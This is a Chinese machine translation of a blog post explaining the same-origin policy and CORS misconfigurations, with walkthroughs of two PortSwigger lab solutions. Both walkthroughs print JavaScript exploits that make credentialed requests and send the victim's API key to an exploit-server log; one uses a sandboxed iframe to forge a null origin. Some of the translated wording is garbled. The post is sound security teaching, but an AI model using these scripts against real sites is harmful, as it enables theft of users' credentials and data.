<html>
<head>
<title>Cross-origin resource sharing (CORS) Explanation &amp; Exploitation ☠</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">跨源资源共享(CORS)解释和开发☠</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cross-origin-resource-sharing-cors-explanation-exploitation-b4179235728b?source=collection_archive---------0-----------------------#2022-11-10">https://infosecwriteups.com/cross-origin-resource-sharing-cors-explanation-exploitation-b4179235728b?source=collection_archive---------0-----------------------#2022-11-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="b342" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">嗨！我的名字是Hashar Mujahid，今天我们将谈论跨起源资源共享(CORS)。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/fe8096b6a31e57a64f9e4eba112ca274.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zb0GzPvxSsnwuBOu.png"/></div></div></figure><p id="f1f3" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">让我们从基础开始。我们走吧。</p><p id="11a8" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">要了解CORS，我们首先需要了解什么是SOP(同源政策)。</p><h2 id="7e14" class="ln lo iq bd lp lq lr dn ls lt lu dp lv la lw lx ly le lz ma mb li mc md me mf bi translated"><strong class="ak">什么是SOP？</strong></h2><p id="4419" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">同源策略是一种安全机制，它限制从一个源(域)加载的资源如何与另一个源(域)的资源交互。</p><p id="ae73" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">它限制恶意网站从其他网站上用户的认证会话中请求数据。主要是拯救用户免受CSRF攻击。</p><p id="ef50" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">产地:</strong></p><p id="8790" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">理解什么是起源是非常重要的。来源由URL的协议、主机名和端口号定义。如果两个网站具有相同的协议、主机名和端口，它们将被归类为同源网站。如果其中一个属性是不同的，那么他们将不会是相同的网站。</p><blockquote class="ml mm mn"><p id="75e4" class="kr ks mo kt b ku kv jr kw kx ky ju kz mp lb lc ld mq lf lg lh mr lj lk ll lm ij bi translated">草案</p><p id="3f88" class="kr ks mo kt b ku kv jr kw kx ky ju kz mp lb lc ld mq lf lg lh mr lj lk ll lm ij bi translated">主机名</p><p id="4304" class="kr ks mo kt b ku kv jr kw kx ky ju kz mp lb lc ld mq lf lg lh mr lj lk ll lm ij bi translated">港口</p></blockquote><p id="b4c7" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">通过SOP测试应该是一样的。</p><p id="c2ef" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">举例:</strong></p><p id="36cb" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们有下面给出的2个网站。</p><ul class=""><li id="5183" class="ms mt iq kt b ku kv kx ky la mu le mv li mw lm mx my mz na bi translated"><code class="fe nb nc nd ne b">http://test.com/testapp1/index.html</code></li><li id="b7c5" class="ms mt iq kt b ku nf kx ng la nh le ni li nj lm mx my mz na bi translated"><code class="fe nb nc nd ne b">http://test.com/testapp2/index.html</code></li></ul><p id="f273" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">他们是不是同宗？这是因为如果你关注我们提到的所有三个属性，这两个网站是相同的。它们有相同的协议<code class="fe nb nc nd ne b">http</code>，所以它们也有相同的端口，因为<code class="fe nb nc nd ne b">http</code>默认使用端口80。而且两个网站的主机名都是一样的<code class="fe nb nc nd ne b">test.com</code>。主机名后面的目录和路径无关紧要，因为上面的检查足以测试SOP。</p></div><div class="ab cl nk nl hu nm" role="separator"><span class="nn bw bk no np nq"/><span class="nn bw bk no np nq"/><span class="nn bw bk no np"/></div><div class="ij ik il im in"><p id="7ba2" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在我们对什么是SOP有了一些了解，我们应该看看什么是CORS，为什么我们需要它。</p><h2 id="e78a" class="ln lo iq bd lp lq lr dn ls lt lu dp lv la lw lx ly le lz ma mb li mc md me mf bi translated"><strong class="ak">什么是CORS？</strong></h2><p id="361e" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">正如我们所知，SOP限制加载相同来源之外的资源，但如果我们真的需要加载一些重要的资源，这就是CORS的切入点，它允许对位于给定域之外的资源进行受控访问。它延伸并增加了同源政策的灵活性。但是，如果网站的CORS策略配置和实施不当，它也提供了跨域攻击的可能性。攻击者可以执行CSRF攻击来对用户造成损害。</p><h2 id="50ae" class="ln lo iq bd lp lq lr dn ls lt lu dp lv la lw lx ly le lz ma mb li mc md me mf bi translated">我们为什么需要CORS？</h2><p id="4763" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">为了理解我们为什么需要CORS，我们需要举个例子。让我们假设我们有两个网站A和B。网站A需要从网站B加载一些资源(如图像或一些js文件)，但由于开发者实施的严格同源策略(SOP ),它会失败。使用CORS(跨源资源共享)可以绕过这个问题。这有助于为我们的SOP政策增加一些灵活性，并允许我们从受信任的网站加载资源。</p><p id="2764" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">因为同源策略非常严格，所以人们提出了许多绕过它的技术。许多网站与子域名或第三方网站交互，需要完全的跨源访问。利用跨原产地资源共享，有管理地放宽同源政策是可能的(CORS)。</p><p id="be74" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">像Access-Control-Allow-Origin response这样的报头用于实现cors。</p><h2 id="ba2e" class="ln lo iq bd lp lq lr dn ls lt lu dp lv la lw lx ly le lz ma mb li mc md me mf bi translated">什么是访问控制允许起源响应头？</h2><p id="dd7c" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">Access-Control-Allow-Origin标头包含在一个网站对来自另一个网站的请求的响应中，它定义了请求的允许来源。如果Access-Control-Allow-Origin与请求网站的来源匹配，则web浏览器允许访问该响应。</p><p id="8925" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">例如:</strong></p><p id="3d14" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">假设一个原点为<code class="fe nb nc nd ne b">normal-website.com</code>的网站引起如下跨域请求:</p><pre class="kg kh ki kj gt nr ne ns nt aw nu bi"><span id="d898" class="ln lo iq ne b gy nv nw l nx ny">GET /data HTTP/1.1 <br/>Host: robust-website.com <br/>Origin : <a class="ae nz" href="https://normal-website.com" rel="noopener ugc nofollow" target="_blank">https://normal-website.com</a></span></pre><p id="21e2" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><code class="fe nb nc nd ne b">robust-website.com</code>上的服务器返回如下响应:</p><pre class="kg kh ki kj gt nr ne ns nt aw nu bi"><span id="1ff4" class="ln lo iq ne b gy nv nw l nx ny">HTTP/1.1 200 OK ... <br/>Access-Control-Allow-Origin: <a class="ae nz" href="https://normal-website.com" rel="noopener ugc nofollow" target="_blank">https://normal-website.com</a></span></pre><p id="cb04" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">浏览器将允许运行在<code class="fe nb nc nd ne b">normal-website.com</code>上的代码访问响应，因为来源匹配。</p><p id="5213" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><code class="fe nb nc nd ne b">Access-Control-Allow-Origin</code>的规范允许多个原点，或者值<code class="fe nb nc nd ne b">null</code>，或者通配符<code class="fe nb nc nd ne b">*</code>。然而，没有一个浏览器支持多个来源，并且对通配符<code class="fe nb nc nd ne b">*</code>的使用有限制。</p></div><div class="ab cl nk nl hu nm" role="separator"><span class="nn bw bk no np nq"/><span class="nn bw bk no np nq"/><span class="nn bw bk no np"/></div><div class="ij ik il im in"><p id="2871" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在，我们对CORS有了足够的了解，我们可以考虑由于错误配置的CORS实现而可能出现的漏洞。</p><h1 id="3862" class="oa lo iq bd lp ob oc od ls oe of og lv jw oh jx ly jz oi ka mb kc oj kd me ok bi translated">服务器从客户端指定的原始标头生成的ACAO标头</h1><p id="92a8" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">一些应用程序需要允许访问许多域，保持一个白名单域的列表是一个很大的工作，任何错误都可能导致破坏功能。为了避免这种工作网站允许从任何其他领域的访问。</p><p id="9b62" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">例如:</strong></p><p id="44fd" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">网站收到请求。</p><p id="5177" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">像这样:</p><pre class="kg kh ki kj gt nr ne ns nt aw nu bi"><span id="d1e3" class="ln lo iq ne b gy nv nw l nx ny">GET /sensitive-victim-data HTTP/1.1 <br/>Host: paypal.com<br/>Origin: https://malicious-website.com <br/>Cookie: sessionid=...</span></pre><p id="a124" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">PayPal服务器的回应是:</p><pre class="kg kh ki kj gt nr ne ns nt aw nu bi"><span id="050b" class="ln lo iq ne b gy nv nw l nx ny">HTTP/1.1 200 OK <br/>Access-Control-Allow-Origin: https://malicious-website.com <br/><strong class="ne ir">Access-Control-Allow-Credentials: true ==&gt; Allows cookie to be included </strong></span></pre><p id="99b4" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">该回复指出，恶意网站已经并可以请求获取和请求我们的数据，并且还可以在请求时包含我们的cookie。</p><p id="53e7" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">这意味着任何网站都可以请求我们在易受攻击的PayPal服务器上的宝贵数据。</p><h2 id="969a" class="ln lo iq bd lp lq lr dn ls lt lu dp lv la lw lx ly le lz ma mb li mc md me mf bi translated">实验室:CORS漏洞与基本起源反射。</h2><p id="033c" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">这个网站有一个不安全的CORS配置，因为它信任所有的来源。</p><p id="1d90" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">为了解决这个实验，编写一些JavaScript，使用CORS来检索管理员的API密钥，并将代码上传到您的漏洞利用服务器。当您成功提交管理员的API密钥时，实验就完成了。</p><p id="c077" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">您可以使用以下凭证登录您自己的帐户:<code class="fe nb nc nd ne b">wiener:peter</code></p><p id="a8c6" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">进入实验室。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ol"><img src="../Images/5eb88e884822354f2f66ec5703e016fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tgEkHb4V0zy1aCUEEMm3Xg.png"/></div></div></figure><p id="d952" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">登录后，我们可以看到一个API密钥，我们需要获取管理员的API密钥来完成实验。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ol"><img src="../Images/47ce3f22548f1779ea7556ea7ab03b36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2nRbg8Zj-NA2wOZ6YRdaJA.png"/></div></div></figure><p id="a6de" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以在burp中看到对<code class="fe nb nc nd ne b">/account-details</code>的请求，该请求获取用户的数据。将此请求发送到中继器。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi om"><img src="../Images/9905852c73014763f268d3a3a1a0b6cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gVTLRhQXjcQeQNJkLWYq_Q.png"/></div></div></figure><p id="b51f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">让我们测试一下错误配置的CORS。在我们的请求中添加一个ORIGIN头，看看响应是否允许。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi on"><img src="../Images/bd33effca7e90dc363bc9ebcd95938ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MA5xRIBfHfKy-HQbnAsr2w.png"/></div></div></figure><p id="5f2c" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们的网站被列入ACAO的标题。现在我们知道我们的网络是易受攻击的，但问题是我们如何通过它访问管理密钥。我们需要编写一个javascript代码并将其托管在我们的漏洞利用服务器上，以便在受害者访问它时包含对请求的响应。</p><pre class="kg kh ki kj gt nr ne ns nt aw nu bi"><span id="9dca" class="ln lo iq ne b gy nv nw l nx ny">&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;script&gt;<br/>var req = new XMLHttpRequest(); <br/>req.onload = reqListener; <br/>req.open('get','https://0a08005b047893acc0ef1484004100a1.web-security-academy.net/accountDetails',true); <br/>req.withCredentials = true; req.send();  <br/>function reqListener() {    <br/>location='/log?key='+this.responseText; <br/>};<br/>&lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="e959" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">该脚本将向/accountDetails发出请求，并将响应添加到我们的漏洞利用服务器日志中的链接。</p><p id="df0b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">将漏洞存储在我们的服务器上，然后将其发送给受害者，之后当我们检查访问日志时，我们可以看到管理员的信息被泄露。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oo"><img src="../Images/b215265ced03745947109230afe1864f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*un7W6PwvLimYDeLeN3D4Mw.png"/></div></div></figure><p id="1b29" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">这就是错误配置的CORS实现泄露个人信息的方式。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi op"><img src="../Images/43330a81904a26aaafa6dfec9555e19c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WxmEvYatUcllDnZwJLCM6w.png"/></div></div></figure><h1 id="e84e" class="oa lo iq bd lp ob oc od ls oe of og lv jw oh jx ly jz oi ka mb kc oj kd me ok bi translated">解析原始标头时出错:</h1><p id="1e10" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">一些网站允许访问白名单中的域名及其所有子域。这可能是一个安全风险，因为攻击者可能能够通过注册一个类似的子域来绕过此过滤器。</p><p id="6eb8" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir">例如:</strong></p><p id="fbb5" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">场景A:</p><p id="c14d" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">站点A允许所有域名以<code class="fe nb nc nd ne b">inocent.com</code>结尾。攻击者可能会注册一个域名<code class="fe nb nc nd ne b">hackerinocent.com</code>，并获得执行CORS的权限。</p><p id="eb18" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">场景B:</p><p id="e46f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">假设一个应用程序授权访问以<code class="fe nb nc nd ne b">incocent.com</code>开头的所有域，攻击者可以使用<code class="fe nb nc nd ne b">inocent.com.evil.com</code>绕过它，获得CORS访问权限。</p><h1 id="7219" class="oa lo iq bd lp ob oc od ls oe of og lv jw oh jx ly jz oi ka mb kc oj kd me ok bi translated">列入白名单的空原始值:</h1><p id="eea2" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">Origin Header也支持将<code class="fe nb nc nd ne b">null</code>作为一个值，浏览器可能会在某些情况下发送一个空值，例如</p><blockquote class="ml mm mn"><p id="1c81" class="kr ks mo kt b ku kv jr kw kx ky ju kz mp lb lc ld mq lf lg lh mr lj lk ll lm ij bi translated">来自序列化数据的请求。</p><p id="9a9d" class="kr ks mo kt b ku kv jr kw kx ky ju kz mp lb lc ld mq lf lg lh mr lj lk ll lm ij bi translated">使用<code class="fe nb nc nd ne b">file:</code>协议请求。</p><p id="c8f1" class="kr ks mo kt b ku kv jr kw kx ky ju kz mp lb lc ld mq lf lg lh mr lj lk ll lm ij bi translated">沙盒跨来源请求。</p><p id="1dd9" class="kr ks mo kt b ku kv jr kw kx ky ju kz mp lb lc ld mq lf lg lh mr lj lk ll lm ij bi translated">跨原点重定向。</p></blockquote><p id="1e8e" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">开发人员可能会在应用程序的本地开发期间将null添加到while列出的域中，而忘记在生产中删除它。</p><p id="43fc" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">这将带来安全风险，因为攻击者可能会发出请求:</p><pre class="kg kh ki kj gt nr ne ns nt aw nu bi"><span id="dbef" class="ln lo iq ne b gy nv nw l nx ny">GET /sensitive-victim-data <br/>Host: vulnerable-website.com <br/>Origin: null</span></pre><p id="59d6" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">服务器会用。</p><pre class="kg kh ki kj gt nr ne ns nt aw nu bi"><span id="7c75" class="ln lo iq ne b gy nv nw l nx ny">HTTP/1.1 200 OK <br/>Access-Control-Allow-Origin: null <br/>Access-Control-Allow-Credentials: true</span></pre><h2 id="c45a" class="ln lo iq bd lp lq lr dn ls lt lu dp lv la lw lx ly le lz ma mb li mc md me mf bi translated"><a class="ae nz" href="https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack" rel="noopener ugc nofollow" target="_blank">实验室:受信任的空起源的CORS漏洞</a></h2><p id="9621" class="pw-post-body-paragraph kr ks iq kt b ku mg jr kw kx mh ju kz la mi lc ld le mj lg lh li mk lk ll lm ij bi translated">这个网站有一个不安全的<a class="ae nz" href="https://portswigger.net/web-security/cors" rel="noopener ugc nofollow" target="_blank"> CORS </a>配置，因为它信任“空”来源。</p><p id="e648" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">为了解决这个实验，编写一些JavaScript，使用CORS来检索管理员的API密钥，并将代码上传到您的漏洞利用服务器。当您成功提交管理员的API密钥时，实验就完成了。</p><p id="59a6" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">您可以使用以下凭证登录您自己的帐户:<code class="fe nb nc nd ne b">wiener:peter</code></p><p id="d2e1" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">使用提供的凭据访问实验室并登录。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi om"><img src="../Images/e7be0a65ce56a764efdb2b56fad8824f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zaqy7yFYtYyjL9OuM_-CNQ.png"/></div></div></figure><p id="dd9f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在，通过向我们的请求添加一个origin报头并监视响应来测试CORS错误配置。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oq"><img src="../Images/b8ba05491b7cffed36604ab8db3eb9ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cKXdyxcNmZgPsx0Q0O9ySQ.png"/></div></div></figure><p id="76fc" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">因为我们的域名不在白名单中。</p><p id="ef47" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以尝试将原点值设置为null，看看会得到什么样的响应。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi om"><img src="../Images/73b5a07c420aadd6ce9bee2a8b57c9d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lT_I8-PH6Tz3jbYmXNvnGw.png"/></div></div></figure><p id="76ac" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">看起来开发者忘记了从白名单中删除null。</p><p id="e691" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在，我们需要编写一个脚本来利用这个漏洞获取受害者的数据。</p><pre class="kg kh ki kj gt nr ne ns nt aw nu bi"><span id="0a9f" class="ln lo iq ne b gy nv nw l nx ny">&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;<br/>    var req = new XMLHttpRequest();<br/>    req.onload = reqListener;<br/>    req.open('get','<a class="ae nz" href="https://0a73002703504f63c036079300b20068.web-security-academy.net/accountDetails',true" rel="noopener ugc nofollow" target="_blank">https://0a73002703504f63c036079300b20068.web-security-academy.net/accountDetails',true</a>);<br/>    req.withCredentials = true;<br/>    req.send();<br/>    function reqListener() {<br/>        location='<a class="ae nz" href="https://exploit-0a0600c503a24f9ec0e6070d015300d2.exploit-server.net/log?key='+encodeURIComponent(this.responseText);" rel="noopener ugc nofollow" target="_blank">https://exploit-0a0600c503a24f9ec0e6070d015300d2.exploit-server.net/log?key='+encodeURIComponent(this.responseText);</a><br/>    };<br/>&lt;/script&gt;"&gt;&lt;/iframe&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="1654" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">iframe将帮助我们用一个空的源发起请求，之后，响应将被添加到我们的日志中。如果我们点击查看我们的漏洞并在拦截器中密切监控我们的流量。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi om"><img src="../Images/ff8d4f1fe8c9d44f92aed7bd9c684d69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NAtapNWWEH_o6Sny8Txd-A.png"/></div></div></figure><p id="8f1b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以看到请求是使用空原点发出的。</p><p id="9182" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我希望你喜欢这个博客。在接下来的博客中，我们将讨论更多利用CORS的方法，以及如何防止CORS漏洞。</p><p id="987b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">如果你喜欢，可以考虑跟着我。</p><p id="7e27" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">下次再见，直到那时。</p><p id="e94e" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">快乐的黑客❤！</p><figure class="kg kh ki kj gt kk"><div class="bz fp l di"><div class="or os l"/></div></figure></div><div class="ab cl nk nl hu nm" role="separator"><span class="nn bw bk no np nq"/><span class="nn bw bk no np nq"/><span class="nn bw bk no np"/></div><div class="ij ik il im in"><h2 id="00f3" class="ln lo iq bd lp lq lr dn ls lt lu dp lv la lw lx ly le lz ma mb li mc md me mf bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae nz" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>，以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>